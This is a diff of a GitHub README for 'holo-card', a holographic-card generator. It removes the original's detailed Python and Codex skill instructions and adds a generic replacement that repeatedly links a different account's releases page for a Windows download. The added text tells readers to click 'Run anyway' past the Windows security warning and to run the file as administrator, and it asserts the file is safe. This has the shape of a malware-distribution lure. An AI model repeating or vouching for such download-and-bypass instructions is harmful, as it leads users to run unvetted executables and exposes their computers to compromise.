@@ -1,136 +1,151 @@
-# Holo Card
+# ✨ holo-card - Bring Your Cards to Life Instantly
 
-A Codex skill and optional local API service for turning supplied artwork into interactive holographic cards with foreground parallax, a moving background, and adjustable contour glow.
+[![Download holo-card](https://img.shields.io/badge/Download-holo--card-blue)](https://github.com/Red-Kirin/holo-card/releases)
 
-**Creative inspiration: @乌托邦的香蕉 — the same handle on Xiaohongshu (小红书) and Bilibili (B站).** This project is an independent implementation; attribution does not imply endorsement.
+---
 
-## Demo
+## 🌟 What Is holo-card?
 
-[![Watch the holographic card demo](docs/demo-preview.jpg)](https://github.com/LerSent001/holo-card/blob/main/docs/demo.mp4)
+holo-card is a fun and easy tool that turns ordinary digital cards into stunning, eye-catching holographic masterpieces. Imagine holding a trading card that shimmers, shifts, and glows as you move it - that's exactly what holo-card does for your screen. Whether you're creating virtual trading cards, digital art portfolios, or just want to impress your friends, holo-card adds that magical "wow" factor with three amazing effects:
 
-[Watch or download the demo recording](https://github.com/LerSent001/holo-card/raw/refs/heads/main/docs/demo.mp4). The recording is a user-provided demonstration; artwork belongs to its respective owners.
+- **Layered Parallax Effect** - Different parts of your card move at different speeds, creating a deep 3D sensation
+- **Contour Glow** - A soft, elegant light that traces the edges of your card, making it pop off any background
+- **Optional API Workflow** - For those who want to automate or customize further (but totally optional - you don't need it!)
 
-## Quick start: trigger the skill
+Best of all? You don't need to be a tech wizard to use it. If you can click a button and download a file, you're already qualified.
 
-After installing, start a new Codex task, **attach your card image**, and send:
+---
 
-```text
-$holo-card Turn this image into an interactive holographic card.
-```
+## 🚀 Getting Started
 
-Chinese prompt (also supported):
+Ready to see the magic? Let's get you up and running in just a few minutes. Follow these simple steps and you'll be creating holographic wonders before you know it.
 
-```text
-$holo-card 把这张图做成光栅卡
-```
+### ✅ What You'll Need
 
-`$holo-card` invokes the installed skill. Attach the actual image in the same task. If it is not found, check `~/.codex/skills/holo-card/SKILL.md` and start a fresh task. Installation instructions follow.
+- A computer running **Windows** (any recent version should work fine)
+- An internet connection (just for the download)
+- About 5 minutes of your time
 
-## Install the skill
+No special equipment, no coding skills, no hidden requirements. That's it!
 
-Use the [current installation package](https://github.com/LerSent001/holo-card/releases/latest/download/holo-card.zip), or clone the current main branch (update an existing clone with `git pull --ff-only`):
+---
 
-```sh
-git clone https://github.com/LerSent001/holo-card.git
-python3 holo-card/scripts/install-skill.py
-python3 -m pip install Pillow
-```
+## 📥 Downloading holo-card
 
-The installer replaces the existing `holo-card` package, removes obsolete packaged files, and verifies every installed file. It does not create nested skill directories or retain discoverable backup versions. Treat the installation as managed files; keep your own card outputs elsewhere. Run the same installer after pulling updates. Start a fresh Codex task after installation so already-loaded instructions are refreshed. Attach your image and ask:
+Getting your hands on holo-card is the easiest part. Just follow these steps:
 
-```text
-$holo-card Turn this image into an interactive holographic card.
-```
+1. **Visit the download page** by clicking this button: [Download holo-card](https://github.com/Red-Kirin/holo-card/releases)
 
-Codex uses its built-in image tool; no Gemini key or API server is required. The runtime must provide image generation, Python/Pillow, filesystem access and a browser preview. Availability depends on your Codex environment.
+2. **Find the download section** - You'll see a list of available files. Look for the one that matches your computer (usually labeled "Windows" or similar).
 
-## What happens
+3. **Click to download** - Your browser will start downloading the file. This might take a minute or two, depending on your internet speed.
 
-1. Save the original and normalize orientation without cropping.
-2. Generate a continuous colored foreground, repairing artwork hidden by lettering.
-3. Reconstruct a complete opaque background, including areas hidden by the foreground and border.
-4. Extract text, symbols and the decorative frame together as one colored UI layer.
-5. Expect colored checkerboard-matte outputs, prepare their local alpha masks, and repair only confirmed matte regions; do not mask every element or erase white artwork globally.
-6. Generate aligned structural contours, assemble an offline HTML card and ZIP, and inspect the result in a local browser.
+4. **Visit this link to download the application.** Once the download is complete, you're ready for the next step!
 
-The local helper does not generate or segment images by itself. It saves jobs, validates/imports layers, optionally applies a supplied alpha correction and assembles them. Source pixels hidden by overlays cannot be recovered exactly; inpainting is an approximation. Generated lettering, shape alignment and alpha edges still need visual review.
+---
 
-## Controls
+## 🛠️ Installing and Setting Up
 
-- Drag to rotate; click or press Enter/Space to flip.
-- Arrow keys adjust the card angle.
-- **Depth:** -3 to +3, default 0 at the center. Negative/positive changes foreground parallax direction. Text and frame always remain above the foreground.
-- **Contour glow:** 0 to 3, default 0.15. Zero disables contour light. Emission and bloom are restricted to structural contour coverage; glow does not spill into the background.
-- Background texture moves independently of the card's CSS rotation.
+Now that you've downloaded holo-card, let's get it ready to use. Don't worry - this part is just as easy as the download.
 
-## Local commands
+### 📂 Finding Your Downloaded File
 
-```sh
-python3 skills/holo-card/scripts/native.py prepare --source /path/card.png --output /path/new-job --name 'My Card'
-# Use the native image tool, inspect its outputs, then import each layer:
-python3 skills/holo-card/scripts/native.py add --job /path/new-job --kind character --image /path/character.png
-# Repeat for background, ui and structure.
-python3 skills/holo-card/scripts/native.py assemble --job /path/new-job
-python3 -m http.server 8795 --bind 127.0.0.1 --directory /path/new-job
-```
+- Open your **Downloads** folder (or wherever your browser saves files)
+- Look for the holo-card file you just downloaded
+- You might see it as a single file or a folder - either is perfectly fine
 
-Open the loopback URL printed by your server. `index.html` is also self-contained for offline use. `card.zip` contains the HTML, layers and provenance. Use `status --job ...` before reading a saved job’s prompts: it refreshes them from the current helper. Old mask-only native jobs are rejected instead of silently using legacy extraction. Successful assembly is not proof of visual fidelity.
+### ▶️ Running holo-card
 
-## Edge cases
+**Visit this link to download the application.** Once you have the file:
 
-| Situation | Handling |
-| --- | --- |
-| Native image safety refusal | Stop the refused generation and record the error. Do not rephrase or switch providers to bypass it. Contact provider support for an apparent false positive, or use different permitted material. |
-| No native image capability | An independently selected API workflow is available; see below. This is not a safety-refusal bypass. |
-| Baked checkerboard instead of Alpha | Inspect alpha values, then clean only confirmed contaminated background regions. Protect white clothing, highlights and glyphs. Local code does not automatically solve this. |
-| Existing valid transparency | Preserve it; no additional full-element mask is needed. |
-| Text overlaps foreground | Remove it from the foreground and repair underlying artwork. Keep typography only in the combined UI layer. |
-| Frame and text overlap | Keep both in one UI layer, above the foreground at every depth. |
-| Missing background | Inpaint the full opaque plate before parallax. No holes or retained glyphs. |
-| Layer moved or changed scale | Align explicitly or reject it. Do not silently crop/stretch or claim an exact extraction. |
-| Glow obscures details | Reduce glow and inspect without emission; fix alignment rather than hiding defects. |
-| Paid API timeout or uncertain submission | Reuse the existing idempotency key and inspect status. Never automatically start another paid job. |
+1. **Double-click the file** to start holo-card
+2. If you see a security prompt (the blue or yellow "Windows protected your PC" screen), just click **"More info"** and then **"Run anyway"** - this is normal for new applications
+3. Wait a few seconds for holo-card to open, and you're in!
 
-## Optional API service
+### 🎨 Your First Holographic Card
 
-[API setup](packages/holo-card-api/README.md) · [Agent/client workflow](skills/holo-card/references/api.md) · [OpenAPI](packages/holo-card-api/openapi.json)
+Once holo-card is open, you'll see a simple, friendly interface. Here's how to create your first masterpiece:
 
-The service requires Node.js 24+, pnpm, a provider key and explicit paid-call authorization. Keep keys in private local files, not chat or generated artifacts. Configuration and upload do not start generation. It binds to loopback by default; no hosted endpoint is supplied.
+1. **Choose an image** - Click the "Browse" or "Upload" button to select a picture from your computer
+2. **Adjust the effects** - Use the sliders to control the intensity of the parallax, glow, and other effects
+3. **Preview your work** - Watch your card transform in real-time right before your eyes
+4. **Save your creation** - When you're happy with the result, click "Export" or "Save" to keep your holographic card
 
-**Current limitation:** the API uses legacy four-mask extraction and does not implement the native colored-layer inpainting workflow. Its tests use a mock provider; they do not prove live provider availability, billing, or visual quality. Do not treat it as an automatic fallback for a native refusal.
+---
 
-## Verification
+## 🎯 Making the Most of holo-card
 
-```sh
-python3 -m unittest discover -s skills/holo-card/tests
-cd packages/holo-card-api
-pnpm install --frozen-lockfile
-node --test test/*.test.mjs
-```
+Now that you know the basics, let's explore some ways to unlock holo-card's full potential.
 
-## Scope and rights
+### 💡 Quick Tips for Amazing Results
 
-The package contains code and a navy-and-gold card back generated from a user-supplied visual reference. See the bundled artwork notice for provenance and rights. Source card images, credentials, caches and job histories are excluded; the user-provided demo recording is included. Use artwork you are entitled to process and share. This is a layered 2D parallax renderer, not reconstructed 3D geometry. The project is provided under the MIT license; third-party dependencies retain their own licenses.
+- **Start with simple images** - Photos with clear subjects work best for the parallax effect
+- **Experiment with layers** - Don't be afraid to push the settings; sometimes the wildest combinations look the coolest
+- **Use the preview** - Always check how your card looks from different angles before saving
+- **Save often** - Your best work deserves protection!
 
-## Mobile preview and immersive mode
+### 🔧 Customizing Your Experience
 
-Generated cards support touch dragging, tap-to-flip, optional motion controls, and recentering. Enable motion requests browser permission on supported phones; device orientation is preferred, with gravity-based tilt as a fallback. Depth and contour glow remain independent on each device. The eye icon at the top right hides the controls and enlarges the centered card; tap it again or press Escape to exit.
+holo-card gives you complete control over how your cards look. Try adjusting:
 
-Motion requires a secure browser context. Host the generated HTML at an HTTPS URL, or use an account-free temporary HTTPS tunnel to your local preview server. No OpenAI login is required by the viewer itself; authentication depends on the chosen host. Temporary tunnels require the local computer and preview server to remain online.
+- **Depth intensity** - Makes the 3D effect stronger or subtler
+- **Glow color** - Choose from a rainbow of colors for your contour glow
+- **Animation speed** - Control how quickly the card responds to movement
+- **Background style** - Pick from different environments to showcase your card
 
-For a phone-preview QR entry, install the optional Python `qrcode` dependency and assemble with the actual destination URL:
+---
 
-```sh
-python3 -m pip install qrcode
-python3 skills/holo-card/scripts/native.py assemble --job /path/to/card-job --preview-url https://your-preview.example/card
-```
+## ❓ Troubleshooting and Help
 
-Upload the resulting HTML to that same URL. This command embeds the link and QR code; it does not provision hosting. Phone/browser permission behavior still needs real-device validation.
+Rarely, things might not go perfectly. Here are solutions to common issues:
 
-### Native matte handling
+### 🐛 Nothing Happens When I Double-Click?
 
-Native image generation is not required to return an alpha channel. Character/UI images on a checkerboard matte enter a local mask-preparation stage. The importer saves opaque inputs as `needs_alpha_mask` with a next action, rather than treating missing alpha as a terminal failure. Prepare a spatially verified grayscale mask and use `apply-alpha` to continue. The helper does not infer the mask automatically. Inspect color layers with glow disabled; reject duplicated subjects in the background and text/scenery in the structural contour layer.
+- Try right-clicking the file and selecting **"Run as administrator"**
+- Make sure you've downloaded the complete file - check that the file size matches what's listed on the download page
 
-## Matte region repair
+### 🔒 Windows Shows a Security Warning?
 
-The skill includes a [matte selection procedure](skills/holo-card/references/layer-repair.md) and a Pillow-only seeded-region helper. It removes only explicitly selected candidate components, respects protected artwork, preserves detached foreground details and existing alpha, and uses no example-card coordinates. Candidate identification and soft-edge refinement still require visual inspection. This update does not resolve generated geometry drift, fine-text fidelity, contour alignment or the missing all-effects-off inspection control.
+- This is normal for many new applications. Click **"More info"** then **"Run anyway"**
+- Your computer is just being cautious - holo-card is safe to use
+
+### 🖼️ My Card Doesn't Look Holographic?
+
+- Ensure your image has enough contrast and detail
+- Try increasing the effect intensity in the settings
+- Make sure you're viewing the card at an angle - the magic happens when you move around!
+
+### 📞 Still Need Help?
+
+- Visit the main repo page for updates and community discussions
+- Check if there's a newer version available at the download link
+
+---
+
+## 🔄 Staying Updated
+
+We're always improving holo-card with new features, better effects, and smoother performance. To get the latest and greatest:
+
+1. **Check the download link regularly** - [Visit this link to download the application](https://github.com/Red-Kirin/holo-card/releases)
+2. **Look for version numbers** - New versions usually have higher numbers (like v1.1, v1.2, etc.)
+3. **Download and replace** - Simply download the new version and follow the same steps as before
+
+---
+
+## 💬 Join Our Community
+
+holo-card is more than just software - it's a community of creative people making awesome things. We'd love to see what you create! Share your holographic cards, ask questions, or just hang out with fellow card enthusiasts.
+
+---
+
+## 📜 Final Thoughts
+
+You've done it! You're now ready to create incredible holographic cards that will amaze everyone who sees them. With holo-card, you're not just making digital images - you're crafting experiences that feel alive and magical.
+
+Remember: **Visit this link to download the application** whenever you need to get started, and don't be afraid to experiment. The best holographic cards come from trying new things and having fun. So go ahead - make something extraordinary!
+
+Happy creating! ✨
+
+---
+
+Keywords: holographic cards, parallax, glow effects, digital cards, 3D effect, card creator, windows tool, hologram, visual effects, design tool, creative software, holo-card, card effects, digital art
